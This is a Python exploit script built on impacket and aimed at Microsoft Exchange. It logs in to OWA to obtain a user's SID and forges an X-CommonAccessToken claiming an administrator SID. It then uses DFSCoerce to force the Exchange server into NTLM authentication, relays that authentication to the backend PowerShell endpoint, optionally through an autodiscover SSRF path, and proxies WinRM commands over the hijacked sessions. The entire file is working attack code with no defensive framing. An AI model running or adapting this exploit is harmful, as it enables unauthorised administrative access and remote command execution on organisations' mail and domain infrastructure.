import logging
import time
import base64
import ssl
import struct

try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady

from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

RELAY_SERVERS = []
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp
from struct import unpack
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket import LOG

# DfsCoerce
import sys
import argparse

from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.uuid import uuidtup_to_bin

# Proxy
from flask import Flask
from flask import request
from flask import Response
import re
import requests
import _thread
import threading
from http.client import CannotSendRequest

# Attack
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack

Global_Server_Connection = None
Global_Server_Connections = []
Connection_Lock = threading.Lock()
Token = ''
HOST = ''
SSRF = False


app = Flask(__name__)
#####################################################
#  Powershell Http Proxy Server
#####################################################
@app.route('/<path:path>', methods=['POST', 'GET'])
def index(path):
    global Global_Server_Connection
    global Global_Server_Connections

    if request.method == 'GET':
        return 'ok'

    req_data = request.stream.read()
    action = re.search(rb'<a:Action s:mustUnderstand="true">(.+?)</a:Action>', req_data)
    assert action, "WinRM action not found"

    req_data = req_data.decode()
    # modify headers
    req_headers = {}
    for k, v in request.headers.items():
        if k == 'Host':
            v = HOST
        if k == 'Authorization':
            continue
        req_headers[k] = v

    req_headers['X-CommonAccessToken'] = Token
    if SSRF:
        req_headers['Cookie'] = 'Email=autodiscover/autodiscover.json?@foo.com'
        new_path = '/autodiscover/autodiscover.json?@foo.com/%s?%s' % (path, request.query_string.decode())
    else:
        new_path = '/%s?%s' % (path, request.query_string.decode())

    with Connection_Lock:
        while (not Global_Server_Connection) and (len(Global_Server_Connections) == 0):
            time.sleep(0.2)
        if not Global_Server_Connection:
            Global_Server_Connection = Global_Server_Connections.pop()

    try:
        print('[+] Send request to PowerShell Server')
        Global_Server_Connection.request("POST", new_path, headers=req_headers, body=req_data)
    except CannotSendRequest:
        print("[-] Cannot send request!")
        with Connection_Lock:
            while len(Global_Server_Connections) == 0:
                print('[+] Wait for Server Connections pool')
                time.sleep(0.2)
            Global_Server_Connection = Global_Server_Connections.pop()
        print('[+] Retry send request to PowerShell Server ')
        Global_Server_Connection.request("POST", new_path, headers=req_headers, body=req_data)

    res = Global_Server_Connection.getresponse()
    res_data = res.read()
    rsp_headers = dict(res.getheaders())
    status = res.status

    print('[+] Get PowerShell Server response: %d' % status)

    # make response
    resp = Response(res_data, status=status)
    for k, v in rsp_headers.items():
        if k in ['Content-Encoding', 'Content-Length', 'Transfer-Encoding']:
            continue
        resp.headers[k] = v

    return resp


#####################################################
# DFSCoerce
#####################################################
class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code

class NetrDfsRemoveStdRoot(NDRCALL):
    opnum = 13
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('ApiFlags', DWORD),
    )

class NetrDfsRemoveStdRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class NetrDfsAddRoot(NDRCALL):
    opnum = 12
    structure = (
        ('ServerName', WSTR),
        ('RootShare', WSTR),
        ('Comment', WSTR),
        ('ApiFlags', DWORD),
    )

class NetrDfsAddRootResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )

class TriggerAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netdfs]' % target)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash,
                                         nthash=nthash)

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp:
            rpctransport.setRemoteHost(targetIp)
        dce = rpctransport.get_dce_rpc()
        print("[-] Connecting to %s" % r'ncacn_np:%s[\PIPE\netdfs]' % target)
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))
            return

        try:
            dce.bind(uuidtup_to_bin(('4FC742E0-4A10-11CF-8273-00AA004AE673', '3.0')))
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))
            return
        print("[+] Successfully bound!")
        return dce

    def NetrDfsRemoveStdRoot(self, dce, listener):
        print("[-] Sending NetrDfsRemoveStdRoot!")
        try:
            request = NetrDfsRemoveStdRoot()
            request['ServerName'] = '%s\x00' % listener
            request['RootShare'] = 'test\x00'
            request['ApiFlags'] = 1
            request.dump()
            resp = dce.request(request)

        except Exception as e:
            print(e)

def DfsCoerce_NtlmRelay(username, password, domain, NtlmRequest_SourceIP, NtlmRequest_TargetIP ):
    trigger = TriggerAuth()
    if '@' in username:
        username = username.split('@')[0]
    #dce = trigger.connect(username='test2', password='P@ssword123', domain='server.cd', lmhash='', nthash='', target='192.168.152.131', doKerberos='', dcHost='', targetIp='')
    dce = trigger.connect(username=username, password=password, domain=domain, lmhash='', nthash='', target=NtlmRequest_SourceIP, doKerberos='', dcHost='', targetIp='')
    if dce is not None:
        trigger.NetrDfsRemoveStdRoot(dce, NtlmRequest_TargetIP)
        #trigger.NetrDfsRemoveStdRoot(dce, '192.168.152.157')
        dce.disconnect()


#####################################################
# Impacket Ntlm Relay Attack
#####################################################
class MyHTTPAttack(ProtocolAttack):

    def run(self):
        global Global_Server_Connections
        Global_Server_Connections.insert(0, self.client)
        print("[+] Get an authed Powershell Server tcp connection, Connections pool: %d" % len(Global_Server_Connections))

class MyHTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = "HTTP"

    def __init__(self, serverConfig, target, targetPort=80, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self):
        self.session = HTTPConnection(self.targetHost, self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path

        if SSRF:
            self.path = '/autodiscover/autodiscover.json?@foo.com/powershell?&Email=autodiscover/autodiscover.json?@foo.com'
        return True

    def sendNegotiate(self, negotiateMessage):
        # Check if server wants auth
        print('[+] sendNegotiate: ', self.path)
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'NTLM' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "NTLM"
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = "Negotiate"
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
            else:
                return False

        # Negotiate auth
        negotiate = base64.b64encode(negotiateMessage).decode("ascii")
        headers = {'Authorization': '%s %s' % (self.authenticationMethod, negotiate)}
        self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search(('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod),
                                              res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        global Global_Server_Connections
        if len(Global_Server_Connections) == 7:
            print('[+] Connections pool is full, Stop Connect')
            return None, STATUS_ACCESS_DENIED

        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token).decode("ascii")
        headers = {'Authorization': '%s %s' % (self.authenticationMethod, auth)}
        headers['X-CommonAccessToken'] = Token
        print('[+] send Auth: ', self.path)
        self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            return None, STATUS_ACCESS_DENIED
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            # Cache this
            self.lastresult = res.read()
            return None, STATUS_SUCCESS

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        # Do a HEAD for favicon.ico
        self.session.request('HEAD', '/favicon.ico')
        self.session.getresponse()

class MyHTTPSRelayClient(MyHTTPRelayClient):
    PLUGIN_NAME = "HTTPS"

    def __init__(self, serverConfig, target, targetPort=443, extendedSecurity=True):
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path

        if SSRF:
            self.path = '/autodiscover/autodiscover.json?@foo.com/powershell?&Email=autodiscover/autodiscover.json?@foo.com'
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost, self.targetPort)
        return True


def start_servers(options, threads):
    for server in RELAY_SERVERS:
        #Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setTargets(targetSystem)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.ntlm_listen)

        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread


def get_sid(username, password, domain):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    url = f'https://{domain}/owa/auth.owa'
    data = f'destination=https://{domain}/owa&flags=4&forcedownlevel=0&username={username}&password={password}&passwordText=&isUtf8=1'

    response = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=False)
    if not response.status_code == 302:
        print('[-] auth failed')
        return

    cadata = re.search(r'cadata=([a-zA-Z0-9\+/=]*);', response.headers['Set-Cookie'])[1]
    cadataTTL = re.search(r'cadataTTL=([a-zA-Z0-9\+/=]*);', response.headers['Set-Cookie'])[1]
    cadataKey = re.search(r'cadataKey=([a-zA-Z0-9\+/=]*);', response.headers['Set-Cookie'])[1]
    cadataIV = re.search(r'cadataIV=([a-zA-Z0-9\+/=]*);', response.headers['Set-Cookie'])[1]
    cadataSig = re.search(r'cadataSig=([a-zA-Z0-9\+/=]*);', response.headers['Set-Cookie'])[1]
    cookie = f'''cadata={cadata}; cadataTTL={cadataTTL}; cadataKey={cadataKey}; cadataIV={cadataIV}; cadataSig={cadataSig}'''
    headers['Cookie'] = cookie

    url = f'https://{domain}/owa/'
    response = requests.get(url, headers=headers, verify=False)
    #response = requests.get(url, headers=headers, verify=False, proxies=proxies)
    if not response.status_code == 200:
        print('[-] auth failed 2')
        return

    sid = re.search('X-BackEndCookie=([S\-0-9]+)=', response.headers['Set-Cookie'])[1]
    return sid

def fake_token(usuid, gsuids):
    logonname = b'SERVER\\whatever'
    token = b'V\x01\x00T\x07WindowsC\x00A\x08Kerberos' + \
            b'L' + struct.pack('< B', len(logonname)) + logonname + \
            b'U' + struct.pack('< B', len(usuid)) + usuid.encode('utf-8') + \
            b'G' + struct.pack('< L', len(gsuids))

    for gsuid in gsuids:
        token = token + b'\x07\x00\x00\x00' + struct.pack('< B', len(gsuid)) + gsuid.encode('utf-8')

    token = token + b"E\x00\x00\x00\x00"
    tokenb64 = base64.b64encode(token)
    return tokenb64.decode()

# Process command-line arguments.
if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                    "try to relay that connection to specified target(s) system or the original client")
    parser._optionals.title = "Main options"

    #Main arguments
    parser.add_argument("-h","--help", action="help", help='show this help message and exit')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t',"--target", action='store', metavar='TARGET', help="Target backend powershell path, example: https://192.168.152.131:444/powershell")
    parser.add_argument('-p', '--password', action='store', metavar='PASSWORD', help='password for DFSCoerce')
    parser.add_argument('-u', '--username', action='store', metavar='USERNAME', help='user name for DfsCoerce')

    parser.add_argument('-ns', '--ntlm-source', action='store', metavar='NTLM_SOURCE', help='ntlm relay source ip, shouble be an exchange server ip')

    parser.add_argument('-nl', '--ntlm-listen', action='store', metavar='NTLM_LISTEN', help='IP address of interface to bind SMB and HTTP servers, and Dfscoerce will trigger an ntlm authentication to this ip, so it can\'t be 0.0.0.0')
    parser.add_argument('-d', '--domain', action='store', metavar='DOMAIN', help='domain name of exchange domain')
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    parser.add_argument('-ssrf', action="store_true", default=False, help='use autodiscover frontend ssrf to proxy to powershell')


    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

    logger.init()
    SSRF = options.ssrf


    HOST = options.target.split('://')[-1].split('/')[0].split(':')[0]

    if SSRF:
        schema = 'https' if options.target.startswith('https') else 'http'
        target_path = '{0}://{1}/'.format(schema, HOST)
        print('[+] Target Path: %s' % target_path)
    else:
        target_path = options.target

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

    PROTOCOL_CLIENTS['HTTP'] = MyHTTPRelayClient
    PROTOCOL_CLIENTS['HTTPS'] = MyHTTPSRelayClient
    PROTOCOL_ATTACKS['HTTP'] = MyHTTPAttack
    PROTOCOL_ATTACKS['HTTPS'] = MyHTTPAttack

    mode = 'RELAY'
    targetSystem = TargetsProcessor(singleTarget=target_path, protocolClients=PROTOCOL_CLIENTS)

    sid = get_sid(options.username, options.password, options.domain)
    if not sid:
        print('[-] Get Sid failed')
        sys.exit(0)

    print('[+] get sid: ', sid)

    index = sid.rfind('-')
    domain_sid = sid[:index + 1]

    gsuids = []
    gsuids.append(domain_sid + '513')  # domain users
    admin_sid = domain_sid + '1000'
    print('[+] test admin sid: ', admin_sid)

    Token = fake_token(admin_sid, gsuids)
    print('[+] fake token: ', Token)

    RELAY_SERVERS.append(SMBRelayServer)
    threads = set()
    c = start_servers(options, threads)

    logging.info("Servers started, waiting for connections")
    try:
        _thread.start_new_thread(app.run, ("0.0.0.0", 8000))
        time.sleep(2)

        DfsCoerce_NtlmRelay(username=options.username, password=options.password, domain=options.domain, NtlmRequest_SourceIP=options.ntlm_source, NtlmRequest_TargetIP=options.ntlm_listen)
        print("[-] DFScoerce over")
        while True:
            time.sleep(5)
    except KeyboardInterrupt:
        pass
    else:
        pass


    for s in threads:
        del s

    sys.exit(0)
